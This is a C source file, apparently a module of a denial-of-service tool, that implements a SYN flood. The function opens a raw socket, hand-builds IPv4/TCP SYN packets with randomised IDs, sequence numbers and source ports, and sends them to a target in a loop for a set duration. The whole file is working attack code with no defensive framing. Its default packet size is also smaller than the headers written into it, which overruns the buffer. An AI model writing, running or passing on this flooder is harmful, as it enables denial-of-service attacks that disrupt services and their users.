#include "syn_attack.h"
#include "checksum.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

void* syn_attack(void* arg) {
    attack_params* params = (attack_params*)arg;

    int syn_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (syn_sock < 0) {
        return NULL;
    }

    int one = 1;
    const int *val = &one;
    setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    int packet_size = params->psize > 0 ? params->psize : 32;
    unsigned char *packet = malloc(packet_size);
    if (!packet) {
        close(syn_sock);
        return NULL;
    }
    memset(packet, 0x00, packet_size);

    struct iphdr* iph = (struct iphdr*) packet;
    struct tcphdr* tcph = (struct tcphdr*) (packet + sizeof(struct iphdr));

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = params->target_addr.sin_port;
    dest.sin_addr = params->target_addr.sin_addr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    tcph->source = htons(params->srcport > 0 ? params->srcport : (rand() % 65535));
    tcph->dest = params->target_addr.sin_port;
    tcph->seq = htonl(rand());
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->ack = 0;
    tcph->psh = 0;
    tcph->rst = 0;
    tcph->fin = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->urg_ptr = 0;

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        iph->id = htons(rand() % 65535);
        iph->check = generic_checksum((unsigned short*)iph, sizeof(struct iphdr));
        tcph->check = tcp_udp_checksum(tcph, sizeof(struct tcphdr), iph->saddr, iph->daddr, IPPROTO_TCP);
        sendto(syn_sock, packet, packet_size, 0, (struct sockaddr*)&dest, sizeof(dest));
    }

    free(packet);
    close(syn_sock);
    return NULL;
}
